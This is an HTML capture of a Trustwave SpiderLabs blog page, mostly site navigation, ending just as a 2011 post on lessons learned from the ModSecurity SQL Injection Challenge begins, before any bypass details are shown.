+            </div>
+        </div>
+
+                                </aside>
+                            </nav>
+                            <nav id="capabilities-tab-content-1">
+                                <button><i class="material-icons">chevron_left</i> Back</button>
+                                <a href="/en-us/capabilities/by-industry/">By Industry</a>
+                                <ul>
+                                    <li><a itemprop="url" href="/en-us/capabilities/by-industry/education/"><span itemprop="name">Education </span><span>Enterprise-grade security designed to fill gaps in K-12 & higher ed</span></a></li>
+                                    <li><a itemprop="url" href="/en-us/capabilities/by-industry/financial-sector/"><span itemprop="name">Financial Sector </span><span>Tech and services for protecting the world’s most asset-heavy sector</span></a></li>
+                                    <li><a itemprop="url" href="/en-us/capabilities/by-industry/government/"><span itemprop="name">Government </span><span>Services to help federal, state & local overcome resource shortages</span></a></li>
+                                    <li><a itemprop="url" href="/en-us/capabilities/by-industry/healthcare/"><span itemprop="name">Health Care </span><span>Solutions for health care to protect infrastructure and ensure compliance </span></a></li>
+                                    <li><a itemprop="url" href="/en-us/capabilities/by-industry/hotels/"><span itemprop="name">Hotels </span><span>Solutions & service packages for the customer-facing lodging industry</span></a></li>
+                                    <li><a itemprop="url" href="/en-us/capabilities/by-industry/legal/"><span itemprop="name">Legal </span><span>A solution set designed for a client-driven industry & hot target</span></a></li>
+                                    <li><a itemprop="url" href="/en-us/capabilities/by-industry/payment-services/"><span itemprop="name">Payment Services </span><span>Digital protection across an evolving, complex & heavily targeted space</span></a></li>
+                                    <li><a itemprop="url" href="/en-us/capabilities/by-industry/restaurants/"><span itemprop="name">Restaurants </span><span>Order up data protection through managed security bundles </span></a></li>
+                                    <li><a itemprop="url" href="/en-us/capabilities/by-industry/retail/"><span itemprop="name">Retail </span><span>Convenient packages to prevent, detect & respond, and address PCI</span></a></li>
+                                </ul>
+                            </nav>
+                            <nav id="capabilities-tab-content-2">
+                                <button><i class="material-icons">chevron_left</i> Back</button>
+                                <a href="/en-us/capabilities/by-mandate/">By Mandate</a>
+                                <ul>
+                                    <li><a itemprop="url" href="/en-us/capabilities/by-mandate/data-privacy/"><span itemprop="name">Data Privacy </span><span>Data protection and breach notification laws have become universal</span></a></li>
+                                    <li><a itemprop="url" href="/en-us/capabilities/by-mandate/fisma/"><span itemprop="name">FISMA </span><span>Federal agencies must get up to speed on securing IT systems</span></a></li>
+                                    <li><a itemprop="url" href="/en-us/capabilities/by-mandate/gdpr/"><span itemprop="name">GDPR </span><span>Flagship law out of the EU is a wake-up call to businesses everywhere</span></a></li>
+                                    <li><a itemprop="url" href="/en-us/capabilities/by-mandate/glba/"><span itemprop="name">GLBA </span><span>Federal law forces financial firms to act on information security</span></a></li>
+                                    <li><a itemprop="url" href="/en-us/capabilities/by-mandate/hipaa/"><span itemprop="name">HIPAA </span><span>Regulations to protect patient data & prevent health care threats</span></a></li>
+                                    <li><a itemprop="url" href="/en-us/capabilities/by-mandate/iso/"><span itemprop="name">ISO </span><span>Satisfy the 27000 series of standards & keep data assets protected</span></a></li>
+                                    <li><a itemprop="url" href="/en-us/capabilities/by-mandate/popi/"><span itemprop="name">POPI </span><span>South Africa’s new regulation addresses personal data processing</span></a></li>
+                                    <li><a itemprop="url" href="/en-us/capabilities/by-mandate/pci/"><span itemprop="name">PCI </span><span>The most prescriptive security standard requires constant vigilance </span></a></li>
+                                    <li><a itemprop="url" href="/en-us/capabilities/by-mandate/sox/"><span itemprop="name">SOX </span><span>Publicly traded firms must show accountability, including around security</span></a></li>
+                                </ul>
+                            </nav>
+                        </section>
+                    </nav>
+                </div>
+            </div>
+            <div class="site-header-content-dropdown" id="dropdown-resources">
+                <div class="site-header-content-dropdown-container">
+                    <nav>
+                        <button><i class="material-icons">chevron_left</i> Back</button>
+                        <a href="/en-us/resources/">Resources</a>
+                        <ul>
+                            <li><a itemprop="url" href="/en-us/resources/blogs/"><span itemprop="name">Blogs &amp; Stories</span></a><button data-toggle="#resources-tab-content-1"></button></li>
+                            <li><a itemprop="url" href="/en-us/resources/library/"><span itemprop="name">Resource Library</span></a><button data-toggle="#resources-tab-content-2"></button></li>
+                            <li><a itemprop="url" href="/en-us/resources/security-resources/"><span itemprop="name">Security Resources</span></a><button data-toggle="#resources-tab-content-3"></button></li>
+                            <li><a itemprop="url" href="/en-us/resources/upcoming/"><span itemprop="name">Events &amp; Live Webinars</span></a><button data-toggle="#resources-tab-content-4"></button></li>
+                        </ul>
+                        <section>
+                            <nav id="resources-tab-content-1">
+                                <button><i class="material-icons">chevron_left</i> Back</button>
+                                <a href="/en-us/resources/blogs/">Blogs &amp; Stories</a>
+                                <ul class="one-third">
+                                    <li><a itemprop="url" href="/en-us/resources/blogs/trustwave-blog/"><span itemprop="name">Trustwave Blog </span><span>A collection of tips and perspective on security hot topics that matter to you</span></a></li>
+                                    <li><a itemprop="url" href="/en-us/resources/blogs/spiderlabs-blog/"><span itemprop="name">SpiderLabs Blog </span><span>Researchers & ethical hackers deliver malware analysis and vulnerability insight </span></a></li>
+                                    <li><a itemprop="url" href="/en-us/resources/trustwave-stories/"><span itemprop="name">Trustwave Stories </span><span>A set of stories about how Trustwave is changing the way you do security</span></a></li>
+                                </ul>
+                                <aside class="two-thirds">
+                                    <div class="row card-list">
+
+                                                <div class="col-lg-6 card-list-item">
+
+            <div class="card">
+                        <div class="card-media">
+                            <a href="/en-us/resources/blogs/spiderlabs-blog/evasive-urls-in-spam/" data-ga-hittype="event" data-ga-category="cta_menu_asset" data-ga-action="click" data-ga-label="EvasiveURLsinSpam" data-ga-value="1">
+                                <span class="card-img" style="padding-top: 56.25%; background-image: url(/media/15279/sl-blog-default-image.jpg?anchor=center&amp;mode=crop&amp;width=400&amp;rnd=131897042940000000);"></span>
+                            </a>
+                        </div>
+                <div class="card-body card-body-overflow" style="height: 160px;">
+                        <p class="mbx">Sep 17, 2020</p>
+                    <h4 class="mbn"><a href="/en-us/resources/blogs/spiderlabs-blog/evasive-urls-in-spam/" data-ga-hittype="event" data-ga-category="cta_menu_asset" data-ga-action="click" data-ga-label="EvasiveURLsinSpam" data-ga-value="1">Evasive URLs in Spam</a></h4>
+                </div>
+                <div class="card-footer"><span class="text-sm text-uppercase text-muted">SpiderLabs Blog</span></div>
+            </div>
+
+                                                </div>
+                                                <div class="col-lg-6 card-list-item">
+
+        <div class="card">
+                <div class="card-media">
+                    <a href="/en-us/resources/blogs/trustwave-blog/when-should-organizations-consider-digital-forensic-services/">
+                        <span class="card-img" style="padding-top: 56.25%; background-image: url(/media/17184/digitalforensics-blog-header.jpg?anchor=center&amp;mode=crop&amp;width=400&amp;rnd=132448344490000000);" data-ga-hittype="event" data-ga-category="cta_menu_asset" data-ga-action="click" data-ga-label="WhenShouldOrganizationsConsiderDigitalForensicServices" data-ga-value="1"></span>
+                    </a>
+                </div>
+            <div class="card-body card-body-overflow" style="height: 160px;">
+                    <p class="mbx">Sep 17, 2020</p>
+                <h4 class="mbn"><a href="/en-us/resources/blogs/trustwave-blog/when-should-organizations-consider-digital-forensic-services/" data-ga-hittype="event" data-ga-category="cta_menu_asset" data-ga-action="click" data-ga-label="WhenShouldOrganizationsConsiderDigitalForensicServices" data-ga-value="1">When Should Organizations Consider Digital Forensic Services?</a></h4>
+            </div>
+                <div class="card-footer"><span class="text-sm text-uppercase text-muted">Perspectives</span></div>
+        </div>
+
+                                                </div>
+                                    </div>
+                                </aside>
+                            </nav>
+                            <nav id="resources-tab-content-2">
+                                <button><i class="material-icons">chevron_left</i> Back</button>
+                                <a href="/en-us/resources/library/">Resource Library</a>
+                                <ul class="two-thirds">
+                                    <li><a itemprop="url" href="/en-us/resources/library/?type=doc&topics=&categories=&tags=&vidcats=&sort=Newest"><span itemprop="name">Documents </span><span>White papers, e-books, infographics and other practical resources.</span></a></li>
+                                    <li><a itemprop="url" href="/en-us/resources/library/?type=webinar&topics=&categories=&tags=&vidcats=&sort=Newest"><span itemprop="name">Webinars </span><span>Webinar replays around the hottest cybersecurity topics today</span></a></li>
+                                    <li><a itemprop="url" href="/en-us/resources/library/?type=video&topics=&categories=&tags=&vidcats=&sort=Newest"><span itemprop="name">Videos </span><span>A library of informative and engaging videos on various security subjects</span></a></li>
+                                    <li><a itemprop="url" href="/en-us/resources/library/?type=doc&topics=&categories=Case%20Study&tags=&vidcats=&sort=Newest"><span itemprop="name">Case Studies </span><span>Stories of our customers’ infosec challenges and how they overcame them</span></a></li>
+                                    <li><a itemprop="url" href="/en-us/resources/library/?type=doc&topics=&categories=Infographic&tags=&vidcats=&sort=Newest"><span itemprop="name">Infographics </span><span>Illustrative storytelling helping you more easily digest security trends and topics</span></a></li>
+                                    <li><a itemprop="url" href="/en-us/resources/library/?type=doc&topics=&categories=Research%20Report&tags=gsr&vidcats=&sort=Newest"><span itemprop="name">Global Security Reports </span><span>The industry's most comprehensive account of cyberthreat and attack data</span></a></li>
+                                    <li><a itemprop="url" href="/en-us/resources/library/?type=doc&topics=&categories=Analyst%20Report&tags=&vidcats=&sort=Newest"><span itemprop="name">Analyst Reports </span><span>As a market leader, experts regularly assess our services and technologies</span></a></li>
+                                </ul>
+                                <aside class="one-third">
+
+        <div class="card">
+                <div class="card-media">
+                    <a href="/en-us/resources/library/documents/trustwave-threat-detection-and-response-services-for-microsoft-azure/" data-ga-hittype="event" data-ga-category="cta_menu_asset" data-ga-action="click" data-ga-label="TrustwaveCoManagedSOCServicesforMicrosoftAzureSentinel" data-ga-value="1">
+                        <span class="card-img" style="padding-top: 56.25%; background-image: url(/media/17183/co-managed-soc-services-azure-sentinel_cover.png?anchor=center&amp;mode=crop&amp;width=400&amp;rnd=132447487100000000);"></span>
+                    </a>
+                </div>
+
+            <div class="card-body card-body-overflow" style="height: 160px;">
+                <p class="mbx">Sep 16, 2020</p>
+                <h4 class="mbn">
+                    <a href="/en-us/resources/library/documents/trustwave-threat-detection-and-response-services-for-microsoft-azure/" data-ga-hittype="event" data-ga-category="cta_menu_asset" data-ga-action="click" data-ga-label="TrustwaveCoManagedSOCServicesforMicrosoftAzureSentinel" data-ga-value="1">Trustwave Co-Managed SOC Services for Microsoft Azure Sentinel</a>
+                </h4>
+            </div>
+            <div class="card-footer">
+                <span class="text-sm text-uppercase text-muted">Data Sheet</span>
+            </div>
+        </div>
+
+                                </aside>
+                            </nav>
+                            <nav id="resources-tab-content-3">
+                                <button><i class="material-icons">chevron_left</i> Back</button>
+                                <a href="/en-us/resources/security-resources/">Security Resources</a>
+                                <ul class="one-third">
+                                    <li><a itemprop="url" href="/en-us/resources/security-resources/security-advisories/"><span itemprop="name">Security Advisories </span><span>An archive of vulnerability discoveries and details from Trustwave SpiderLabs</span></a></li>
+                                    <li><a itemprop="url" href="/en-us/resources/security-resources/software-updates/"><span itemprop="name">Software Updates </span><span>The latest updates to our products and services all in one place</span></a></li>
+                                    <li><a itemprop="url" href="/en-us/resources/security-resources/security-statistics/"><span itemprop="name">Security Statistics </span><span>The ultimate list of security facts and figures based on breach investigations</span></a></li>
+                                    <li><a itemprop="url" href="/en-us/resources/security-resources/special-offers/"><span itemprop="name">Special Offers </span><span>Trial software, subscriptions and tools to make smart security investments</span></a></li>
+                                </ul>
+                                <aside class="two-thirds">
+                                    <div class="row card-list">
+
+                                                <div class="col-lg-6 card-list-item">
+
+        <div class="card">
+                    <div class="card-media">
+                        <a href="/en-us/resources/security-resources/special-offers/appdetectivepro-trial/" data-ga-hittype="event" data-ga-category="cta_menu_asset" data-ga-action="click" data-ga-label="AppDetectivePROTrialLimitedTimeFullLicense" data-ga-value="1">
+                            <span class="card-img" style="padding-top: 56.25%; background-image: url(/media/17186/adp-softwave_cover.png?anchor=center&amp;mode=crop&amp;width=400&amp;rnd=132448500440000000);"></span>
+                        </a>
+                    </div>
+
+            <div class="card-body card-body-overflow" style="height: 160px;">
+                <p class="mbx">Apr 09, 2020</p>
+                <h4 class="mbn">
+                    <a href="/en-us/resources/security-resources/special-offers/appdetectivepro-trial/" data-ga-hittype="event" data-ga-category="cta_menu_asset" data-ga-action="click" data-ga-label="AppDetectivePROTrialLimitedTimeFullLicense" data-ga-value="1">AppDetectivePRO Trial Limited-Time Full License</a>
+                </h4>
+            </div>
+            <div class="card-footer">
+                <span class="text-sm text-uppercase text-muted">Special Offer</span>
+            </div>
+        </div>
+
+                                                </div>
+
+                                    </div>
+                                </aside>
+                            </nav>
+                            <nav id="resources-tab-content-4">
+                                <button><i class="material-icons">chevron_left</i> Back</button>
+                                <a href="/en-us/resources/upcoming/">Events &amp; Live Webinars</a>
+                                <ul class="one-third">
+                                    <li><a itemprop="url" href="/en-us/resources/upcoming/webinars/"><span itemprop="name">Upcoming Webinars </span><span>Join the conversation by participating in live informative security webinars</span></a></li>
+                                    <li><a itemprop="url" href="/en-us/resources/upcoming/events/"><span itemprop="name">Upcoming Events </span><span>Where in the world is Trustwave? Extensive list of upcoming events</span></a></li>
+                                    <li><a itemprop="url" href="/en-us/resources/library/?type=webinar"><span itemprop="name">Webinar Replays </span><span>Webinar replays around the hottest cybersecurity topics today</span></a></li>
+                                </ul>
+                                <aside class="two-thirds">
+                                    <div class="row card-list">
+
+                                                <div class="col-lg-6 card-list-item">
+
+        <div class="card">
+            <div class="card-media">
+                <a href="/en-us/resources/upcoming/events/cisoonline-chicago-1/" data-ga-hittype="event" data-ga-category="cta_menu_asset" data-ga-action="click" data-ga-label="CISOonlineChicago" data-ga-value="1">
+                    <span class="card-img" style="padding-top: 56.25%; background-image: url(/media/17152/ciso-chicago-socialmeta.jpg?anchor=center&amp;mode=crop&amp;width=400&amp;rnd=132435812960000000);"></span>
+                </a>
+            </div>
+            <div class="card-body card-body-overflow" style="height: 160px;">
+                <p class="mbx">Sep 24, 2020</p>
+                <h4 class="mbn"><a href="/en-us/resources/upcoming/events/cisoonline-chicago-1/" data-ga-hittype="event" data-ga-category="cta_menu_asset" data-ga-action="click" data-ga-label="CISOonlineChicago" data-ga-value="1">CISOonline Chicago</a></h4>
+            </div>
+            <div class="card-footer"><span class="text-sm text-uppercase text-muted">Upcoming Event</span></div>
+        </div>
+
+                                                </div>
+                                                <div class="col-lg-6 card-list-item">
+
+        <div class="card">
+            <div class="card-media">
+                <a href="/en-us/resources/upcoming/events/cisoonline-atlanta/" data-ga-hittype="event" data-ga-category="cta_menu_asset" data-ga-action="click" data-ga-label="CISOonlineAtlanta" data-ga-value="1">
+                    <span class="card-img" style="padding-top: 56.25%; background-image: url(/media/17151/ciso-alanta-sector-socialmeta.jpg?anchor=center&amp;mode=crop&amp;width=400&amp;rnd=132435811490000000);"></span>
+                </a>
+            </div>
+            <div class="card-body card-body-overflow" style="height: 160px;">
+                <p class="mbx">Sep 22, 2020</p>
+                <h4 class="mbn"><a href="/en-us/resources/upcoming/events/cisoonline-atlanta/" data-ga-hittype="event" data-ga-category="cta_menu_asset" data-ga-action="click" data-ga-label="CISOonlineAtlanta" data-ga-value="1">CISOonline Atlanta</a></h4>
+            </div>
+            <div class="card-footer"><span class="text-sm text-uppercase text-muted">Upcoming Event</span></div>
+        </div>
+
+                                                </div>
+                                    </div>
+                                </aside>
+                            </nav>
+
+                        </section>
+                    </nav>
+                </div>
+            </div>
+            <div class="site-header-content-dropdown" id="dropdown-company">
+                <div class="site-header-content-dropdown-container">
+                    <nav>
+                        <button><i class="material-icons">chevron_left</i> Back</button>
+                        <a href="/en-us/company/">Company</a>
+                        <ul>
+                            <li><a itemprop="url" href="/en-us/company/about-us/"><span itemprop="name">About Trustwave</span></a><button data-toggle="#company-tab-content-1"></button></li>
+                            <li><a itemprop="url" href="https://jobs.jobvite.com/trustwave" target="_blank"><span itemprop="name">Careers</span></a><button data-toggle="#company-tab-content-2"></button></li>
+                            <li><a itemprop="url" href="/en-us/partnerone/"><span itemprop="name">Partners</span></a><button data-toggle="#company-tab-content-3"></button></li>
+                            <li><a itemprop="url" href="/en-us/company/newsroom/"><span itemprop="name">Newsroom</span></a><button data-toggle="#company-tab-content-4"></button></li>
+                            <li><a itemprop="url" href="/en-us/company/contact/"><span itemprop="name">Contact</span></a><button data-toggle="#company-tab-content-5"></button></li>
+                        </ul>
+                        <section>
+                            <nav id="company-tab-content-1">
+                                <button><i class="material-icons">chevron_left</i> Back</button>
+                                <a href="/en-us/company/about-us/">About Trustwave</a>
+                                <ul class="two-thirds">
+                                    <li><a itemprop="url" href="/en-us/company/about-us/"><span itemprop="name">Our Story </span><span>Our focus is on threat detection and response. This is our story</span></a></li>
+                                    <li><a itemprop="url" href="/en-us/company/about-us/our-history/"><span itemprop="name">Our History </span><span>Explore the major milestones of Trustwave and see how the company has evolved</span></a></li>
+                                    <li><a itemprop="url" href="/en-us/company/about-us/trustwave-fusion-platform/"><span itemprop="name">Trustwave Fusion Platform </span><span>Cloud-native platform that gives enterprises unprecedented visibility and control over their security resources</span></a></li>
+                                    <li><a itemprop="url" href="/en-us/company/about-us/spiderlabs-fusion-center/"><span itemprop="name">SpiderLabs Fusion Center </span><span>The epicenter - a cybersecurity command center in the heart of Chicago</span></a></li>
+                                    <li><a itemprop="url" href="/en-us/company/about-us/advanced-security-operations-centers/"><span itemprop="name">Security Operations Centers </span><span>Distributed worldwide nodes defend our customers from the latest advanced threats </span></a></li>
+                                    <li><a itemprop="url" href="/en-us/company/about-us/spiderlabs/"><span itemprop="name">SpiderLabs </span><span>An elite security team of more than 250 researchers, ethical hackers and incident responders</span></a></li>
+                                    <li><a itemprop="url" href="/en-us/company/about-us/leadership/"><span itemprop="name">Leadership </span><span>Experienced and impassioned experts make up our executive team</span></a></li>
+                                    <li><a itemprop="url" href="/en-us/company/about-us/accolades/"><span itemprop="name">Accolades </span><span>Trustwave is honored to be recognized for some of the industry’s biggest awards</span></a></li>
+                                </ul>
+                                <aside class="one-third">
+                                    <h5><small>Part of the</small> <br />Singtel group of companies</h5>
+                                    <div class="card mbm">
+                                        <div class="card-media">
+                                            <a href="https://www.singtel.com/business" target="_blank">
+                                                <span class="card-img" style="background-color:#ed1a3d; padding: 42px 0;">
+                                                    <img src="/img/logo/Singtel Logo.svg" style="width: 120px;" class="img-responsive center-block" width="120" height="65" alt="Singtel Logo" />
+                                                </span>
+                                            </a>
+                                        </div>
+                                    </div>
+                                    <div class="card mbn">
+                                        <div class="card-media">
+                                            <a href="https://www.optus.com.au/business/" target="_blank">
+                                                <span class="card-img" style="background-color: #00a3ad; padding: 63px 0;">
+                                                    <img src="/img/logo/Optus Logo.svg" style="width: 120px;" class="img-responsive center-block" width="120" height="24" alt="Optus Logo" />
+                                                </span>
+                                            </a>
+                                        </div>
+                                    </div>
+                                </aside>
+                            </nav>
+                            <nav id="company-tab-content-2">
+                                <button><i class="material-icons">chevron_left</i> Back</button>
+                                <a href="https://jobs.jobvite.com/trustwave" target="_blank">Careers</a>
+                                <ul class="one-third">
+                                    <li><a itemprop="url" href="https://jobs.jobvite.com/trustwave/jobs" target="_blank"><span itemprop="name">All Opportunities </span><span>Trustwave is ready to challenge and inspire you</span></a></li>
+                                    <li><a itemprop="url" href="https://jobs.jobvite.com/trustwave/p/paths" target="_blank"><span itemprop="name">Career Paths </span><span>Find your path. Or carve your own</span></a></li>
+                                    <li><a itemprop="url" href="https://jobs.jobvite.com/trustwave/p/globe" target="_blank"><span itemprop="name">Around the Globe </span><span>We're looking for extraordinary people to join us</span></a></li>
+                                    <li><a itemprop="url" href="https://jobs.jobvite.com/trustwave/p/why" target="_blank"><span itemprop="name">Why Trustwave? </span><span>We think you’ll love working at Trustwave. This is why</span></a></li>
+                                </ul>
+                                <aside class="two-thirds"></aside>
+                            </nav>
+                            <nav id="company-tab-content-3">
+                                <button><i class="material-icons">chevron_left</i> Back</button>
+                                <a href="/en-us/partnerone/">Partners</a>
+                                <ul class="one-third">
+                                    <li><a itemprop="url" href="/en-us/partnerone/"><span itemprop="name">PartnerOne Program </span><span>Join forces with Trustwave to protect against the most advance cybersecurity threats</span></a></li>
+                                    <li><a itemprop="url" href="/en-us/company/partner-ecosystem/global-solution-partners/"><span itemprop="name">Technology Partners </span><span>Key partners who augment our broad portfolio of security services</span></a></li>
+                                </ul>
+                                <aside class="two-thirds">
+
+                                    <h4>Trustwave PartnerOne</h4>
+                                    <p class="text-lg mbl">Our program helps partners enhance their go-to-market strategies, drive sales and build their brands. We provide a comprehensive suite of integrated and customizable digital marketing campaigns, sales enablement, and support and training courses.</p>
+                                    <div class="row">
+                                        <div class="col-lg-6">
+                                            <p><a href="https://trustwave.ziftone.com/" target="_blank" class="btn btn-primary btn-block">Partner Login</a></p>
+                                        </div>
+                                        <div class="col-lg-6">
+                                            <p><a href="https://trustwave.ziftone.com/#/page/reg" target="_blank" class="btn btn-default btn-block">Register Now</a></p>
+                                        </div>
+                                    </div>
+                                </aside>
+                            </nav>
+                            <nav id="company-tab-content-4">
+                                <button><i class="material-icons">chevron_left</i> Back</button>
+                                <a href="/en-us/company/newsroom/">Newsroom</a>
+                                <ul class="one-third">
+                                    <li><a itemprop="url" href="/en-us/company/newsroom/news/"><span itemprop="name">News Releases </span><span>Written newsworthy announcements from our communications team</span></a></li>
+                                    <li><a itemprop="url" href="/en-us/company/newsroom/media/"><span itemprop="name">Media Coverage </span><span>News and activity around the world focusing and highlighting Trustwave</span></a></li>
+                                    <li><a itemprop="url" href="/en-us/resources/blogs/"><span itemprop="name">Blogs </span><span>Security advice, research and more – all meant to help you do your job better</span></a></li>
+                                </ul>
+                                <aside class="two-thirds">
+                                    <div class="row card-list">
+                                                <div class="col-lg-6 card-list-item">
+
+            <div class="card">
+        
+                    <div class="card-media">
+                        <a href="/en-us/company/newsroom/news/trustwave-launches-advanced-threat-detection-and-response-for-us-government-agencies/" data-ga-hittype="event" data-ga-category="cta_menu_asset" data-ga-action="click" data-ga-label="TrustwaveLaunchesAdvancedThreatDetectionandResponseforUSGovernmentAgencies" data-ga-value="1">
+                            <span class="card-img" style="padding-top: 56.25%; background-image: url(/media/15280/news-release-default-image.jpg?anchor=center&amp;mode=crop&amp;width=400&amp;rnd=131897043050000000);"></span>
+                        </a>
+                    </div>
+
+                <div class="card-body card-body-overflow" style="height: 160px;">
+                    <p class="mbx">Sep 16, 2020</p>
+                    <h4 class="mbn"><a href="/en-us/company/newsroom/news/trustwave-launches-advanced-threat-detection-and-response-for-us-government-agencies/" data-ga-hittype="event" data-ga-category="cta_menu_asset" data-ga-action="click" data-ga-label="TrustwaveLaunchesAdvancedThreatDetectionandResponseforUSGovernmentAgencies" data-ga-value="1">Trustwave Launches Advanced Threat Detection and Response for U.S. Government Agencies</a></h4>
+                </div>
+                <div class="card-footer"><span class="text-sm text-uppercase text-muted">News Release</span></div>
+            </div>
+
+                                                </div>
+                                                <div class="col-lg-6 card-list-item">
+
+            <div class="card">
+        
+                    <div class="card-media">
+                        <a href="/en-us/company/newsroom/news/trustwave-named-a-leader-in-idc-marketscape-for-worldwide-managed-security-services/" data-ga-hittype="event" data-ga-category="cta_menu_asset" data-ga-action="click" data-ga-label="TrustwaveNamedaLeaderinIDCMarketScapeforWorldwideManagedSecurityServices" data-ga-value="1">
+                            <span class="card-img" style="padding-top: 56.25%; background-image: url(/media/15280/news-release-default-image.jpg?anchor=center&amp;mode=crop&amp;width=400&amp;rnd=131897043050000000);"></span>
+                        </a>
+                    </div>
+
+                <div class="card-body card-body-overflow" style="height: 160px;">
+                    <p class="mbx">Sep 15, 2020</p>
+                    <h4 class="mbn"><a href="/en-us/company/newsroom/news/trustwave-named-a-leader-in-idc-marketscape-for-worldwide-managed-security-services/" data-ga-hittype="event" data-ga-category="cta_menu_asset" data-ga-action="click" data-ga-label="TrustwaveNamedaLeaderinIDCMarketScapeforWorldwideManagedSecurityServices" data-ga-value="1">Trustwave Named a Leader in IDC MarketScape for Worldwide Managed Security Services</a></h4>
+                </div>
+                <div class="card-footer"><span class="text-sm text-uppercase text-muted">News Release</span></div>
+            </div>
+
+                                                </div>
+                                    </div>
+                                </aside>
+                            </nav>
+                            <nav id="company-tab-content-5">
+                                <button><i class="material-icons">chevron_left</i> Back</button>
+                                <a href="/en-us/company/contact/">Contact</a>
+                                <ul class="one-third">
+                                    <li><a itemprop="url" href="/en-us/company/contact/"><span itemprop="name">Global Contact </span><span>Have a question? Let’s get in touch. </span></a></li>
+                                    <li><a itemprop="url" href="/en-us/company/global-locations/"><span itemprop="name">Global Locations </span><span>A directory of our global offices and contact information</span></a></li>
+                                    <li><a itemprop="url" href="/en-us/company/support/"><span itemprop="name">Support </span><span>Support for Trustwave services and solutions</span></a></li>
+                                </ul>
+                                <aside class="two-thirds global-contact-us">
+                                    <div style="border-bottom: 1px solid rgba(0,0,0,.25); padding-bottom: 30px;">
+                                        <h5 class="text-uppercase mbx">Experiencing a Security Breach?</h5>
+                                        <p class="text-sm mbs">Access to immediate incident response assistance.</p>
+                                        <h4 class="mbx"><span class="text-primary">24 Hour Hotline:</span> +1 (866) 659-9097 <small>Option 5</small></h4>
+                                        <p class="mbs">International: +1 (312) 873-7500 <span class="text-sm">Option 4</span></p>
+                                        <p class="mbn"><a href="/en-us/company/contact/security-breach/" class="btn btn-primary btn-sm">Recommended Actions</a></p>
+                                    </div>
+                                    <div class="row" style="padding-top: 30px;">
+                                        <div class="col-sm-6" style="height: 170px;">
+                                            <h5 class="mbx">General</h5>
+                                            <p class="text-sm mbs">To speak to a Trustwave representative.</p>
+                                            <h4 class="mbx">+1 (312) 873-7500</h4>
+                                            <p class="mbn">Monday - Friday <br>8:00 AM - 6:00 PM CT (UTC -6)</p>
+                                        </div>
+                                        <div class="col-sm-6" style="height: 170px; border-left: 1px solid rgba(0,0,0,.25); padding-left: 30px;">
+                                            <h5 class="mbx">Sales</h5>
+                                            <p class="text-sm mbs">Contact a Trustwave solution specialist.</p>
+                                            <h4 class="mbx">+1 (888) 878-7817</h4>
+                                            <p class="mbn">Monday - Friday <br>8:00 AM - 6:00 PM CT (UTC -6)</p>
+                                        </div>
+                                    </div>
+
+                                </aside>
+                            </nav>
+                        </section>
+                    </nav>
+                </div>
+            </div>
+        </div>
+		
+	</div>
+</header>
+
+<div class="loading-indicator">
+    <div class="loading-content">
+        <span class="loading-graphic"></span>
+        <span class="loading-text">Loading...</span>
+    </div>
+</div>
+
+
+    <main class="site-content">
+
+        
+
+<section class="section bg-brand-secondary bg-gradient-horizontal section-padding-top-none section-padding-bottom-none angle-bottom angle-bottom-gray-lightest angle-bottom-front">
+    <span class="angle-top-placeholder"></span><span class="angle-bottom-placeholder"></span>
+    <div class="page-intro">
+        <div class="container">
+            <div class="row">
+                <div class="col-md-10 col-md-offset-1 col-lg-8 col-lg-offset-2">
+                    <h5 class="page-intro-type">Blogs &amp; Stories</h5>
+                    <h1 class="page-intro-title">SpiderLabs Blog</h1>
+                </div>
+            </div>
+            <div class="row">
+                <div class="col-md-10 col-md-offset-1 col-lg-8 col-lg-offset-2">
+                    <p class="page-intro-description">Attracting more than a half-million annual readers, this is the security community&#39;s go-to destination for technical breakdowns of the latest threats, critical vulnerability disclosures and cutting-edge research.</p>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<section class="section bg-gray-lightest">
+    <span class="angle-top-placeholder"></span><span class="angle-bottom-placeholder"></span>
+    <div class="container">
+
+        <div class="row">
+            <div class="col-lg-10 col-lg-offset-1">
+                <div class="blog-post-single">
+                    <article class="blog-post" itemscope itemtype="http://schema.org/Blog">
+                        <div class="card">
+                            <div class="card-body">
+                                <div class="blog-post-header">
+                                        <h1 class="blog-post-title mbm" itemprop="name">ModSecurity SQL Injection Challenge: Lessons Learned</h1>
+                                    <div class="blog-post-meta">
+                                            <div class="blog-post-date"><i class="material-icons">access_time</i><span itemprop="datePublished">July 26, 2011</span></div>
+                                                                                    <div class="blog-post-author" itemprop="creator" itemscope itemtype="http://schema.org/Person"><i class="material-icons">person_outline</i><span itemprop="name">Ryan Barnett</span></div>
+                                        <div class="blog-post-share">
+                                            <i class="material-icons">share</i>
+                                            <div class="addthis_toolbox pull-left">
+                                                <ul class="share-icons custom_images">
+                                                    <li><a data-toggle="tooltip" title="Tweet on Twitter" class="addthis_button_twitter"><img src="/img/icon/social/svg/dark/twitter.svg" alt="Twitter" /></a></li>
+                                                    <li><a data-toggle="tooltip" title="Share on LinkedIn" class="addthis_button_linkedin"><img src="/img/icon/social/svg/dark/linkedin.svg" alt="LinkedIn" /></a></li>
+                                                    <li><a data-toggle="tooltip" title="Share on Facebook" class="addthis_button_facebook"><img src="/img/icon/social/svg/dark/facebook.svg" alt="Facebook" /></a></li>
+                                                    <li><a data-toggle="tooltip" title="Share through email" class="addthis_button_email"><i class="material-icons">email</i></a></li>
+                                                </ul>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="blog-post-content">
+<p>This is a post-mortem blog post to discuss the successful Level II evasions found by participants during the recent <a href="http://www.modsecurity.org/demo/challenge.html" target="_self">ModSecurity SQL Injection Challenge</a>.</p>
+<p>First of all, I would like to thank all those people that participated in the challenge.  All told, we had &gt; 650 participants (based on unique IP addresses) which is a tremendous turn out.  This type of community testing has helped to both validate the strengths and expose the weaknesses of the SQL Injection protections of the <a href="https://www.owasp.org/index.php/Category:OWASP_ModSecurity_Core_Rule_Set_Project" target="_self">OWASP ModSecurity Core Rule Set Project</a>.  The end result of this challenge is that the SQL Injection rules within the CRS have been massively updated and are now available for immediate download as part of the<a href="http://blog.spiderlabs.com/2011/07/announcing-release-of-owasp-modsecurity-core-rule-set-v221.html" target="_self"> v2.2.1 release</a>.</p>
+<h3><span style="font-size: 28px; font-weight: bold;">Level II Bypasses Analysis: In-Depth</span></h3>
+<p>Congratulations goes to the following individuals/teams that achieve Level II status by extracting DB information while evading the inbound CRS SQL Injection rules. </p>
